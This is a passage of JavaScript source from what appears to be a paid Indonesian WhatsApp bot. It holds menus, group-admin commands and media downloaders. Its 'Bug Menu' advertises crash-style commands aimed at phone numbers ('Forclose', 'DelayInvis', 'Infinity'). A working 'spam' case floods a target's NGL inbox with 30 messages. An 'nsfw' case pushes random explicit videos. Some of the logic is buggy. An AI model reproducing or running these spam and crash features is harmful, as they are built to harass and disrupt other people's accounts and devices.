 ⌬ RyzzIsHere 
 ⌬ HanzNotDev
 ⌬ Rbonlym
 ⌬ PANZZ
 ⌬ Kyy official
 ⌬ Ateus Offc
 ⌬ Rafzz official
 ⌬ Xyuu offc
 ⌬ CorzzaModss
 ⌬ F1kz Official
 ⌬ Neuro storm
 ⌬ Nelzz Official
 ⌬ Xinzz Official
 ⌬ EKIK JEMBOT
 ⌬ Lynzz Official
 ⌬ Iky Ztore27`
let buttons = [
        { buttonId: ".menu", buttonText: { displayText: "Back" }, type: 1 },
        { buttonId: ".sc", buttonText: { displayText: "Buy Versi Tele" }, type: 1 }
        
    ];
    let buttonMessage = {
    image: { url: `https://files.catbox.moe/9id6oh.jpg` },
gifPlayback: false,
caption: tampilan,
contextInfo: {
externalAdReply: {
title: 'JustinV20 Fase2',
                    body: 'Tiktok : JustinOfficial',
                    showAdAttribution: true,
                    thumbnailUrl: `https://files.catbox.moe/r14cz4.jpg`,
                    mediaType: 4,
                    MediaUrl: 'www.tiktok.com/@justinandiar',
                    sourceUrl: "www.tiktok.com/@justinandiar",
                }
            },    
        footer: "Developer JustinOfficial",
        buttons: buttons,
        viewOnce: true,
         headerType: 4
    };

const flowActions = [
    {
        buttonId: 'action',
        buttonText: { displayText: 'This Button List' },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramshtml: html.stringify({
                title: "Show All Fitur",
                sections: [
                    {
          title: "Fitur Utama Script Justin",
          highlight_label: "Populer",
                rows: [
        { title: "Bug Menu", description: "Menampilkan Semua Fitur Bug", id: ".bugmenu" }
                      ]
                      },
                      {
          title: "Bagian Fitur Akses Owner",
          highlight_label: "Click",
          rows: [
        { title: "Owner Menu", description: "Menampilkan Fitur Owner", id: ".ownermenu" },
        { title: "Tools", description: "Fitur Main Tools", id: ".tools" }   
                      ]
                    },
                    {
          title: "All Name Partner Justin",
          highlight_label: "Support Justin",
          rows: [
        { title: "Best Friends", description: "Partner Justin", id: ".ptjustin" }
                        ]
                    }
                ]
            })
        },
        viewOnce: true
    },
];


buttonMessage.buttons.push(...flowActions);
await justinn.sendMsg(m.chat, buttonMessage, { quoted: catalems });

await justinn.sendMsg(m.chat, { audio: { url: `https://files.catbox.moe/309zyo.mp3` }, mimetype: 'audio/mp4', ptt: true }, { quoted: m });
      }
      break;
  
case 'ownermenu': case "menuowner": {
const tampilan = `こんにちはですシステムウイルスを使用してあなたを助けるために設計されたボットです助けるあなた。
  
*- 計さ INFORMATION BOT*
 ⌬ Botname : JustinOffc
 ⌬ Version : 20.0.2 Fase2
 ⌬ Mode : *Self* Mode
 ⌬ Status : Vip Buy Only!!

*- 計さ OWNER MENU*
 ⌬ Addowner 
 ⌬ Delowner
 ⌬ Antilink 
 ⌬ Kick
 ⌬ Open
 ⌬ Close
 ⌬ Demote
 ⌬ Promote
 ⌬ Public
 ⌬ Dellete
 ⌬ Hidetag
 ⌬ Tagall
 ⌬ Tagme
 ⌬ Upch-Audio
 ⌬ Banchat
 ⌬ Baned-chat
 ⌬ Unbanchat
 ⌬ Unbaned-chat
 ⌬ Upch2
 ⌬ Kudeta
 ⌬ Spam
`
let buttons = [
        { buttonId: ".sc", buttonText: { displayText: "Buy Versi Tele" }, type: 1 },
        
        
    ];
    let buttonMessage = {
    image: { url: `https://files.catbox.moe/9id6oh.jpg` },
gifPlayback: false,
caption: tampilan,
contextInfo: {
externalAdReply: {
title: 'JustinV20 Fase2',
                    body: 'Tiktok : JustinOfficial',
                    showAdAttribution: true,
                    thumbnailUrl: `https://files.catbox.moe/r14cz4.jpg`,
                    mediaType: 4,
                    MediaUrl: 'www.tiktok.com/@justinandiar',
                    sourceUrl: "www.tiktok.com/@justinandiar",
                }
            },    
        footer: "Developer JustinOfficial",
        buttons: buttons,
        viewOnce: true,
         headerType: 4
    };

const flowActions = [
    {
        buttonId: 'action',
        buttonText: { displayText: 'This Button List' },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramshtml: html.stringify({
                title: "Show All Fitur",
                sections: [
                    {
          title: "Fitur Utama Script Justin",
          highlight_label: "Populer",
                rows: [
        { title: "Bug Menu", description: "Menampilkan Semua Fitur Bug", id: ".bugmenu" }
                      ]
                      },
                      {
          title: "Bagian Fitur Akses Owner",
          highlight_label: "Click",
          rows: [
        { title: "Owner Menu", description: "Menampilkan Fitur Owner", id: ".ownermenu" },
        { title: "Tools", description: "Fitur Main Tools", id: ".tools" }   
                      ]
                    },
                    {
          title: "All Name Partner Justin",
          highlight_label: "Support Justin",
          rows: [
        { title: "Best Friends", description: "Partner Justin", id: ".ptjustin" }
                        ]
                    }
                ]
            })
        },
        viewOnce: true
    },
];

// Tambahkan flowActions ke buttonMessage
buttonMessage.buttons.push(...flowActions);

// Kirim pesan
await justinn.sendMsg(m.chat, buttonMessage, { quoted: catalems });
await justinn.sendMsg(m.chat, { audio: { url: `https://files.catbox.moe/309zyo.mp3` }, mimetype: 'audio/mp4', ptt: true }, { quoted: m });
      }
      break
  
  case 'bugmenu': case "menubug": {
const tampilan = `こんにちはですシステムウイルスを使用してあなたを助けるために設計されたボットです助ける。

*- 計さ BUG MENU*
 ⌬ WraperOsCards 628xxxx
 ⌬ Forclose 628xxxx
 ⌬ Izalcs 628xxxx
 ⌬ Izalfcbos 628xxxx
 ⌬ Propovers 628xxxx
 ⌬ Infinity 628xxxx
 ⌬ DelayInvis 628xxxx`
let buttons = [
        { buttonId: ".sc", buttonText: { displayText: "Buy Versi Tele" }, type: 1 },
        
        
    ];
    let buttonMessage = {
    image: { url: `https://files.catbox.moe/9id6oh.jpg` },
gifPlayback: false,
caption: tampilan,
contextInfo: {
externalAdReply: {
title: 'JustinV20 Fase2',
                    body: 'Tiktok : JustinOfficial',
                    showAdAttribution: true,
                    thumbnailUrl: `https://files.catbox.moe/r14cz4.jpg`,
                    mediaType: 4,
                    MediaUrl: 'www.tiktok.com/@justinandiar',
                    sourceUrl: "www.tiktok.com/@justinandiar",
                }
            },    
        footer: "Developer JustinOfficial",
        buttons: buttons,
        viewOnce: true,
         headerType: 4
    };

const flowActions = [
    {
        buttonId: 'action',
        buttonText: { displayText: 'This Button List' },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramshtml: html.stringify({
                title: "Show All Fitur",
                sections: [
                    {
          title: "Fitur Utama Script Justin",
          highlight_label: "Populer",
                rows: [
        { title: "Bug Menu", description: "Menampilkan Semua Fitur Bug", id: ".bugmenu" }
                      ]
                      },
                      {
          title: "Bagian Fitur Akses Owner",
          highlight_label: "Click",
          rows: [
        { title: "Owner Menu", description: "Menampilkan Fitur Owner", id: ".ownermenu" },
        { title: "Tools", description: "Fitur Main Tools", id: ".tools" }   
                      ]
                    },
                    {
          title: "All Name Partner Justin",
          highlight_label: "Support Justin",
          rows: [
        { title: "Best Friends", description: "Partner Justin", id: ".ptjustin" }
                        ]
                    }
                ]
            })
        },
        viewOnce: true
    },
];

// Tambahkan flowActions ke buttonMessage
buttonMessage.buttons.push(...flowActions);

// Kirim pesan
await justinn.sendMsg(m.chat, buttonMessage, { quoted: catalems });
await justinn.sendMsg(m.chat, { audio: { url: `https://files.catbox.moe/309zyo.mp3` }, mimetype: 'audio/mp4', ptt: true }, { quoted: m });
      }
      break
              
  case 'owner': {
      justinn.sendContact(m.chat, kontributor, m)
      justinn.sendMsg(from, {
          text : `Gausa Spam,Chat Langsung Ke Inti!`,
          mentions: [sender]
      }, { quoted: m })
  }
  break;        
 
       case "baned":
       case "baneduser":{
           if (isBan) return
           if (!Access) return reply(mess.owner)
           let who;
           try {
               if (m.isGroup)
                   who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender;
           } catch (err) {
               if (m.isGroup) who = text + "@s.whatsapp.net";
           }
           if (!who) return reply("tag atau reply yang mau di banned");
           const isBen = user_ban.includes(who);
           if (isBen) return reply(`${isBen} telah di banned !!`);
           user_ban.push(who);
           fs.writeFileSync("./start/lib/database/banned.html", html.stringify(user_ban, 2, null));
           await sleep(500);
           reply(who + "\npftt, di bann anjg aowkaowwk");
       }
       break;
                
       case "unbaneduser":
       case "unbanuser":{
           if (isBan) return
           if (!Access) return reply(mess.owner)
           let whe;
           try {
               if (m.isGroup)
                   whe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender;
           } catch (err) {
               if (m.isGroup) whe = text + "@s.whatsapp.net";
           }
           if (!whe) return reply("tag atau reply nomor yang mau di unban");
           user_ban.splice(whe, 1);
           fs.writeFileSync("./start/lib/database/banned.html", html.stringify(user_ban, 2, null));
           await sleep(500);
           reply(whe + "\ndah ke unban");
       }
       break;
                
       case "listbanuser":
       case "listbaned":{
           if (isBan) return
           if (!Access) return reply(mess.owner)
           var textban = `list user terbanned di database : *${user_ban.length}*`;
           await justinn.sendMsg(m.chat, {
               text: textban,
               contextInfo: {
                   externalAdReply: {
                       title: `Justin V20`,
                       body: "Developer Justin",
                       thumbnailUrl: cinahitam,
                       sourceUrl: 'https://whatsapp.com/channel/0029VaxxUio545v2bL3FE91g',
                       mediaType: 1,
                       renderLargerThumbnail: true,
                   }
               }
           }, { quoted: x });
       }
       break;
                

           

            
case 'tovocal':
  case 'getvocal':
    case 'vocal':{
        if (isBan) return
        if (!text) return reply(`Example : ${prefix + command} kimetsu no yaiba`)
        let search = await yts(text);
        await reaction(m.chat, "⏳")
        let telaso = search.all[0].url;
        let puqi = await VocalRemover(telaso);
          let vocalAudio = puqi.stuffs.find(item => item.bizType === 'vocal').key;
          justinn.sendMsg(m.chat, {
              audio: { url : vocalAudio },
              mimetype: 'audio/mpeg', 
              ptt: true
          },{quoted:x})
        }
      break;
            
case 'remini': {
        if (isBan) return
        if (!quoted || !/image/.test(mime)) return reply(`reply image dengan caption ${prefix + command}`)          
        const peler = await quoted.download()              
        let getResult;             
        const ImgLarger = require("./lib/scrape/remini")    
        await reaction(m.chat, "⏳")
        const imgLarger = new ImgLarger();
        try {    
            const Logger = await imgLarger.processImage(peler, 4);
            getResult = Logger.data.downloadUrls[0];
            await justinn.sendMsg(m.chat, {      
                image: { url: `${getResult}` }, 
                caption: `> fetching - unlimited

status: succes
creator: rasilius`
            },{ quoted: m });
        } catch (error) { 
            console.error('Proses gagal total:', error.message);        
        }
    }
    break;
                
case 'banchat':{
    if (isBan) return
    if (!Access) return reply(mess.owner)
    if (global.db.data.chats[m.chat].isBanned = true) return reply("Sudah Active")
    global.db.data.chats[m.chat].isBanned = true
    reply("berhasil banchat")
}
break;

case 'unbanchat':{
    if (isBan) return
    if (!Access) return reply(mess.owner)
    if (global.db.data.chats[m.chat].isBanned = false) return reply("Sudah Off")
    global.db.data.chats[m.chat].isBanned = false
    reply("berhasil unbanchat")
}
break;
            
case 'toimage': 
  case 'toimg': {
      if (isBan) return
      if (!/webp/.test(mime)) return reply(`reply sticker dengan caption *${prefix + command}*`)
      let media = await justinn.downloadAndSaveMediaMessage(quoted)
      await reaction(m.chat, "⏳")
      let ran = await getRandomFile('.png')  
      exec(`ffmpeg -i ${media} ${ran}`, (err) => {
          fs.unlinkSync(media)
          if (err) return err 
          let buffer = fs.readFileSync(ran)   
          justinn.sendMsg(m.chat, {   
              image: buffer     
          }, { quoted: x })
          fs.unlinkSync(ran)
      }
    )
  }
  break;
                
  case "pin":
  case "pinterest":{
      if (isBan) return
      if (!text) return reply(`Example : ${prefix + command} Foto Justin`);
      await reaction(m.chat, "⏳")
      let anu = await pinterest(text);
      let result = anu[Math.floor(Math.random() * anu.length)];
      justinn.sendButtonImg(m.chat,
        [
            {
                id: `${prefix + command} ${text}`,
                text: 'Selanjutnya',
                type: 1
            }
        ],"Sukses", result, "Developer JustinOfficial", m, {viewOnce: true })
  }
  break;
  
  case "upch1":
  case "upch-audio":{
      if (isBan) return
      if (!Access) return reply(mess.owner)
      await reaction(m.chat, "⏱️")
      await sleep(3000)
      await reaction(m.chat, "⏳")
      justinn.sendMsg(`${global.idch}`,{ 
          audio : await quoted.download(),
          mimetype: 'audio/mp4',
          ptt: true
      })
      await sleep(2000)
      await reaction(m.chat, "✅")
  }
  break;
 
 //=============== CASE GRUP ================//
  case 'h':
  case 'ht':
  case 'hidetag': {
      if (isBan) return
      if (!m.isGroup) return reply(mess.group)
      if (!isAdmins && !Access) return reply(mess.admin)
      if (m.quoted) {
          justinn.sendMsg(m.chat, {
              forward: m.quoted.fakeObj,
              mentions: participants.map(a => a.id)
          })
      }
      if (!m.quoted) {
          justinn.sendMsg(m.chat, {
              text: q ? q : '',
              mentions: participants.map(a => a.id)
          }, { quoted: x })
      }
  }
  break;
                
  case "kick":
  case "kik":
  case "kontol":{
      if (isBan) return
      if (!m?.isGroup) return reply(mess.group)
      if (!isAdmins) return reply(mess.admin)
      if (!isBotAdmins) return reply(mess.botadmin)
      if (!text && !m?.quoted) return reply(`reply atau tag dengan caption ${prefix + command}`)
      let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
      await justinn.groupParticipantsUpdate(m?.chat, [users], 'remove').catch(console.log)
  }
  break;
                
  case 'antilink': {
      if (isBan) return	
      if (!m.isGroup) return reply(mess.group)
      if (!isAdmins && !Access) return reply(mess.admin)		
      if (!isBotAdmins) return reply(mess.botdmin)
      if (!text) return reply(`silakan pilih opsinya, on/off, contoh ${prefix + command} on/off`)
      if (args[0] === "on") {
          if (global.db.data.chats[m.chat].antilink) return reply(`aktif`)
          global.db.data.chats[m.chat].antilink = true
          reply('successfully activate antilink in this group')
      } else if (args[0] === "off") {		
          if (!global.db.data[m.chat].antilink) return reply(`udah nonaktif`)
          global.db.data[m.chat].antilink = false
          reply('successfully disabling antilink in this group')
      }
  }
  break;
          
 case 'tagme': {
     if (isBan) return
     if (!isGroup) return false;
     let menst = [m.sender];
     justinn.sendMsg(m.chat, { 
         text: `@${m.sender.split('@')[0]}`,  
         mentions: menst        
     }
   )   
 }
 break;
                
 case 'promote':
 case 'promotegb': {
     if (isBan) return
     if (!m.isGroup) return reply(mess.group)
     if (!Access && !isAdmins) return reply(mess.admin)
     if (!isBotAdmins) return reply(mess.botadmin)
     if (!m.quoted && !m.mentionedJid[0] && isNaN(parseInt(args[0]))) return reply('tag/reply pesan target yang ingin di jadikan admin!')
     let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
     if (!m.mentionedJid[0] && !m.quoted && !text) return reply(`tag/reply target yang mau di ${command}`)
     await reaction(m.chat, "🩸")
     await justinn.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply('sukses promote member')).catch((err) => reply('terjadi kesalahan'))
 }
 break;
                
 case 'demote':
 case 'demotegb': {
     if (isBan) return
     if (!m.isGroup) return reply(mess.group)
     if (!Access && !isAdmins) return reply(mess.admin)
     if (!isBotAdmins) return reply(mess.botadmin)
     if (!m.quoted && !m.mentionedJid[0] && isNaN(parseInt(args[0]))) return m.warning('tag/reply pesan target yang ingin di un admin!')
     let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
     if (!m.mentionedJid[0] && !m.quoted && !text) return m.warning(`tag/reply target yang mau di ${command}`)
     await reaction(m.chat, "🩸")
     await justinn.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply('sukses demote admin')).catch((err) => reply('terjadi kesalahan'))
 }
 break;
 
      case 'open':
      case 'buka': {
          if (!m.isGroup) return reply(mess.group)
          if (!isAdmins && !Access) return reply(mess.admin)
          if (!isBotAdmins) return m.tolak(mess.botadmin)
          justinn.groupSettingUpdate(m.chat, 'not_announcement')
          reply(`sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini`)
      }
      break;
                
      case 'close':
      case 'tutup': {
          if (!m.isGroup) return reply(mess.group)
          if (!isAdmins && !Access) return reply(mess.admin)
          if (!isBotAdmins) return m.tolak(mess.botadmin)
          justinn.groupSettingUpdate(m.chat, 'announcement')
          reply(`sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini`)
      }
      break;
            
      case'totag':{
        if (isBan) return
        if (!isAdmins) return reply(mess.admin);
        if (!m.isGroup) return reply(mess.group);
        if (!m.quoted) return reply(`reply pesan dengan caption ${prefix + command}`);
        const groupMetadata = await justinn.groupMetadata(m.chat);
        const participants = groupMetadata.participants;

        justinn.sendMsg(m.chat, {
            forward: m.quoted.fakeObj,
            mentions: participants.map((a) => a.id)
           }, { quoted: x });
         }
        break;
            
      case'tagall':{
        if (isBan) return
        if (!isAdmins) return reply(mess.admin);
        if (!m.isGroup) return reply(mess.group);

        const textMessage = args.join(" ") || "kosong";
        let teks = `pesan tagall :\n> *${textMessage}*\n\n`;

        const groupMetadata = await justinn.groupMetadata(m.chat);
        const participants = groupMetadata.participants;

        for (let mem of participants) {
            teks += `@${mem.id.split("@")[0]}\n`;
        }

        justinn.sendMsg(m.chat, {
            text: teks,
            mentions: participants.map((a) => a.id)
        }, { quoted: x });
      }
      break;
      case 'delete':
      case 'd':
      case 'del': {
        if (isBan) return
	    if (!m.quoted) return reply('reply pesan yang mau di hapus')
          await justinn.sendMsg(m.chat, {
              delete: {
                  remoteJid: m.chat,
                  id: m.quoted.id,
                  participant: m.quoted.sender
              }
          })
      }
	  break;
//=============== ACCESS ================//
case 'addprem': {
    if (isBan) return
    if (!Access) return reply(mess.owner)
    const kata = args.join(" ")
    const nomor = kata.split("|")[0];
    const hari = kata.split("|")[1];
    if (!nomor) return reply(`Example : ${prefix + command} @tag|30d`)
    if (!hari) return reply(`Akses Dengan Hari`)
    let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : nomor.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    if (owner.includes(users)) return reply('Ganti Add Via Owner\n*Contoh* : addowner 628123456789')
    const idExists = _prem.checkPremiumUser(users)
    if (idExists) return reply('')
    let data = await justinn.onWhatsApp(users)
    if (data[0].exists) {
        await reaction(m.chat, '⏳')
        _prem.addPremiumUser(users, hari)
        await sleep(3000)
        let cekvip = ms(_prem.getPremiumExpired(users) - Date.now())
        let teks = `Sukses Status Premium 
*User* : @${users.split("@")[0]}
*Expired* : ${hari.toUpperCase()}
*Akses Hari* : ${cekvip.days} Hari, ${cekvip.hours} Jam, ${cekvip.minutes} Menit`
        const contentText = {
            text: teks,
            contextInfo: {	
                mentionedJid: justinn.ments(teks),
                externalAdReply: {
                    title: `Premium User V20`,
                    previewType: "PHOTO",
                    thumbnailUrl: `https://files.catbox.moe/snlnz4.jpeg`,
                    sourceUrl: 'https://whatsapp.com/channel/0029VaxxUio545v2bL3FE91g'
                }	
            }	
        };	
        return justinn.sendMsg(m.chat, contentText, { quoted: x })
    } else {		
         reply("not found")
    }	
}
break;
                
case 'delprem': {
    if (isBan) return
    if (!Access) return reply(mess.owner)
    if (!args[0]) return reply(`Example : ${prefix}delprem @tag`)
    let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    const idExists = _prem.checkPremiumUser(users)
    if (!idExists) return reply("Not Usser Premium")
    let data = await justinn.onWhatsApp(users)
    await reaction(m.chat, "🩸")
    if (data[0].exists) {	
        let premium = html.parse(fs.readFileSync('./start/lib/database/premium.html'));
        premium.splice(_prem.getPremiumPosition(users), 1)
        fs.writeFileSync('./start/lib/database/premium.html', html.stringify(premium))		
        reply('Done Dellete Its Usser!')
    } else {	
        reply("not found")
    }
}
break;
                
case 'addowner': {
    if (isBan) return
    if (!Access) return reply(mess.owner);
    if (!args[0]) return reply(`Example ${prefix + command} 628xxx`);
    const prem1 = text.split("|")[0].replace(/[^0-9]/g, '');
    const cek1 = await justinn.onWhatsApp(`${prem1}@s.whatsapp.net`);
    if (cek1.length == 0) return reply("masukkan nomor yang valid dan terdaftar di WhatsApp!")      
    kontributor.push(prem1);
    await reaction(m.chat, "🩸")
    fs.writeFileSync('./start/lib/database/owner.html', html.stringify(kontributor));
    reply(`sukses menjadikan ${prem1} sebagai owner`); 
    justinn.sendMsg(`${prem1}@s.whatsapp.net`, { 
        text: `selamat, kamu sekarang bagian dari owner`},{quoted:x}
           );
        }
        break;

case 'delowner': {
    if (isBan) return
    if (!Access) return reply(mess.owner);
    if (!args[0]) return reply(`Example ${prefix + command} 628xxx`);
    const prem2 = text.split("|")[0].replace(/[^0-9]/g, '');
            const unp = kontributor.indexOf(prem2);
            if (unp !== -1) {
                kontributor.splice(unp, 1);
                await reaction(m.chat, "🩸")
                fs.writeFileSync('./start/lib/database/owner.html', html.stringify(kontributor));
                reply(`yah ${prem2} sudah bukan lagi bagian dari owner`);
            } else {
                reply(`${prem2} tidak ada dalam list owner.`);
            }
        }
        break;
            
        case 'public': {
            if (isBan) return
            if (!Access) return reply(mess.owner) 
            justinn.public = true
            reply(`successfully changed to ${command}`)
        }
        break;
            
        case 'self': {
            if (isBan) return
            if (!Access) return reply(mess.owner) 
            justinn.public = false
            reply(`successfully changed to ${command}`)
        }
        break;

//=============== TOOLS ================//
            
case 'sticker':
case 's':
case 'stiker': {
    if (isBan) return
    if (!quoted) return reply(`reply image/video dengan caption ${prefix + command}`);
    try {
        if (/image/.test(mime)) {
            const media = await quoted.download();
            await reaction(m.chat, "🩸")
            const imageUrl = `data:${mime};base64,${media.toString('base64')}`;
            await makeStickerFromUrl(imageUrl, justinn, m);
        } else if (/video/.test(mime)) {
            if ((quoted?.msg || quoted)?.seconds > 10) return reply('Durasi video maksimal 10 detik!')
                const media = await quoted.download();
                const videoUrl = `data:${mime};base64,${media.toString('base64')}`;
                await makeStickerFromUrl(videoUrl, justinn, m);
            } else {
                return reply('Kirim gambar/video dengan caption .s (video durasi 1-10 detik)');
            }
        } catch (error) {
            console.error(error);
            return reply('Terjadi kesalahan saat memproses media. Coba lagi.');
        }
    }
    break;
        
      
    case 'instagram':
    case 'ig': {
        if (isBan) return;
        if (!text) return reply(`Example: ${prefix + command} https://www.instagram.com/reel/jembutmoax`);
    
        let memek = await igdl(text);
        await reaction(m.chat, "⏳");
    
        let respon = memek.data;
        if (respon && respon.length > 0) {
        
            let uniqueUrls = new Set(respon.map(item => item.url));
            try {
                for (let mediaUrl of uniqueUrls) {
                    const headResponse = await axios.head(mediaUrl);
                    const mimeType = headResponse.headers['content-type'];

                    const isImage = /image\/.*/.test(mimeType);
                    const isVideo = /video\/.*/.test(mimeType);

                    if (isImage) {
                        await justinn.sendMsg(m.chat, {
                            image: { url: mediaUrl },
                            caption: "berhasil mendownload gambar dari URL."
                        }, { quoted: m });
                    } else if (isVideo || mimeType === 'application/octet-stream') {
                        await justinn.sendMsg(m.chat, {
                            video: { url: mediaUrl },
                            caption: "berhasil mendownload video dari URL."
                        }, { quoted: m });
                    } else {
                        await justinn.sendMsg(m.chat, {
                            text: `tipe media tidak didukung: ${mimeType}`
                        }, { quoted: m });
                    }
                }
            } catch (error) {
                console.error('Error fetching media type:', error);
                reply(error)
            }
        } else {
            await justinn.sendMsg(m.chat, {
                text: "Tidak ditemukan media atau terjadi kesalahan saat mengambil media."
            }, { quoted: x });
        }
    }
    break;
      
      case 'fb':
      case 'fbdl':
      case 'facebook':{
          if (isBan) return
          if (!text) return reply(`Example : ${prefix + command} https://www.facebook.com/share/jembutmoax`)
          let woii = await fetchhtml(`https://api.siputzx.my.id/api/d/facebook?url=${text}`)
          await reaction(m.chat, "🩸")
          let hitam = woii.data;
          let peler = hitam.video;
          let anunya = hitam.userInfo.name
          justinn.sendMsg(m.chat, { 
              video: { url: peler }, 
              caption: `source : ${anunya}` }, 
           { quoted: x }
         );
      }
      break;
                
      case'ai':
      case'gemini':
      case'openai':
      case'chatgpt':{
        if (isBan) return
        if (!text) return reply(`Example ${prefix + command} siapakah presiden Indonesia sekarang?`)
          let cuki = await fetchhtml(`https://loco.web.id/wp-content/uploads/api/v1/bingai.php?q=${text}`)
          await reaction(m.chat, "⏳")
          let mamad = cuki.result.ai_response
          justinn.sendMsg(m.chat, { text : mamad }, {quoted:x})
      }
      break;
            
      case'pin':{
        if (isBan) return
        if (!text) return reply(`Example : ${prefix + command} https://pin.it/1DyLc8cGU`);
        let res = await pindl(text);
          await reaction(m.chat, "⏳")
        let mek = res.data.result;

        if (mek && mek.data) {
            const mediaUrl = mek.data;
            const isImage = mediaUrl.match(/\.(jpeg|jpg|png|gif)$/i);
            const isVideo = mediaUrl.match(/\.(mp4|webm|ogg)$/i);

            if (isImage) {
                await justinn.sendMsg(m.chat, {
                    image: { url: mediaUrl },
                    caption: "Successfully downloaded photo using the Pinterest URL"
                }, { quoted: x });
            } else if (isVideo) {
                await justinn.sendMsg(m.chat, {
                    video: { url: mediaUrl },
                    caption: "Successfully downloaded video using the Pinterest URL"
                }, { quoted: x });
            } else {
                await justinn.sendMsg(m.chat, {
                    text: "Unsupported media type received."
                }, { quoted: x });
            }
        } else {
            await justinn.sendMsg(m.chat, {
                text: "No media found or an error occurred while retrieving media."
            }, { quoted: x });
        }
      }
      break;
          
      case'spam':{
        if (isBan) return
        if (!text) return reply(`berikan pesan dan username target, contoh ${prefix + command} justin wkwk?`)
        let peler = text.split("|")[0]
        let laso = text.split("|")[1]
        for (let j = 0; j < 30; j++) {
        await spamngl(peler, laso)
        }
          await reaction(m.chat, "🩸")
        justinn.sendMsg(m.chat, {
            text: `sukses spam NGL ke ${peler} sebanyak 30x` 
          },{quoted:x})
      }
      break;
            
        case'brat':{
            if (!isPremium && users.limit < 0) return reply(mess.limited); 
            users.limit -= 1;
            if (isBan) return
            if (!text) return reply(`Example : ${prefix + command} Justin Ganteng`)
            const imageUrl = `https://brat.caliphdev.com/api/brat?text=${text}`;
            await reaction(m.chat, "⏳")
            await makeStickerFromUrl(imageUrl, justinn, m);
        }
                
                
      case 'q':
      case 'quoted': {
        if (isBan) return
          if (!m.quoted) return reply('reply pesannya')
          let gwm = await justinn.serializeM(await m.getQuotedObj())
          if (!gwm.quoted) return reply('pesan yang anda reply tidak mengandung reply')
          await gwm.quoted.copyNForward(m.chat, true)
      }
      break;

      case 'tovn': {
        if (isBan) return
        if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`reply video/vn dengan caption ${prefix + command}`);
        if (!quoted) return reply(`Reply video/vn with caption ${prefix + command}`);
        await reaction(m.chat, "⏳")
        await sleep(5000);
        let media = await quoted.download();
        let { toAudio } = require('./lib/converter');
        let audio = await toAudio(media, 'mp4');
        justinn.sendMsg(m.chat, { audio, mimetype: 'audio/mpeg', ptt: true }, { quoted: m });
      }
        break;

case "nsfw": {
        	reply(`ngocok terus dekk`)
			sbe = await randomNsFw()
			cejd = sbe[Math.floor(Math.random(), sbe.length)]
			justinn.sendMsg(m.chat, {
				video: { url: cejd.video_1 },
				caption: `*Title* : ${cejd.title}
*Category* : ${cejd.category}
*Mimetype* : ${cejd.type}
*Views* : ${cejd.views_count}
*Shares* : ${cejd.share_count}
*Source* : ${cejd.link}
*Media Url* : ${cejd.video_1}`
			}, { quoted: x })
		}

		break;

case 'pinvid': case 'pinterestvideo': case 'pinvideo': {
    if (!text) return reply('Masukkan kata kunci untuk mencari video di Pinterest!');
    async function PinterestVid(teks) {
        const url = `https://id.pinterest.com/resource/BaseSearchResource/get/?_=1619980301559&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${encodeURIComponent(teks)}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&source_url=%2Fsearch%2Fpins%2F%3Fq%3D${encodeURIComponent(teks)}`;
        try {
            const response = await axios.get(url);
            const data = response.data;
            if (!data || !data.resource_response || !data.resource_response.data || !data.resource_response.data.results) {
                return []; 
            }
            const results = data.resource_response.data.results;
            const videoUrls = results
                .filter(pin => pin.story_pin_data) 
                .flatMap(pin => {
                    const pages = pin.story_pin_data.pages;
                    if (pages && pages.length > 0) {
                        const blocks = pages[0].blocks;
                        if (blocks && blocks.length > 0) {
                            const videoList = blocks[0].video && blocks[0].video.video_list;
                            if (videoList) {
                                return Object.values(videoList)
                                    .map(video => video.url)
                                    .filter(url => url); 
                            }
                        }
                    }
                    return [];
                });
            return videoUrls;
        } catch (error) {
            return { error: error.message };
        }
    }

    const result = await PinterestVid(text);
    if (result.error) {
        reply(`Terjadi kesalahan: ${result.error}`);
    } else if (result.length === 0) {
        reply('Tidak ditemukan');
    } else {
        reply(`search results :\n\n${result.join('\n')}`);
    }}
    break;

case 'upch2': {
    if (!text && !quoted) return reply(`text atau media yg mau di up`)
    let messageOptions = {}
    let captionText = text ? text : ""
    let mediaType = ""
    let mediaUrl = ""
    if (quoted) { 
        let mimeType = quoted.mtype || m.mtype
        if (/image/.test(mimeType)) {
            mediaType = "image"
        } else if (/video/.test(mimeType)) {
            mediaType = "video"
        } else if (/audio/.test(mimeType)) {
            mediaType = "audio"
        }
        if (mediaType) {
            let media = await justinn.downloadAndSaveMediaMessage(quoted)
            mediaUrl = media
        } else {
            return reply(`media type is not supported`)
        }
    }
    if (mediaType === "audio") {
        messageOptions.audio = { url: mediaUrl }
        messageOptions.mimetype = "audio/mp4"
        messageOptions.ptt = true
    } else if (mediaType) {
        messageOptions[mediaType] = { url: mediaUrl }
        if (captionText) messageOptions.caption = captionText
    } else {
        messageOptions.text = captionText;
    }
    messageOptions.contextInfo = {
        isForwarded: true,
        serverMessageId: -1,
        forwardingScore: 256,
        externalAdReply: {
            showAdAttribution: true,
            title: "Justin Official V20",
            body: `Bít.ly/JustinOfficial`,
            thumbnailUrl: 'https://files.catbox.moe/1no8wl.jpg',
            sourceUrl: "www.tiktok.com/@justinandiar",
            mediaType: 1,
            renderLargerThumbnail: false,
        },
    }
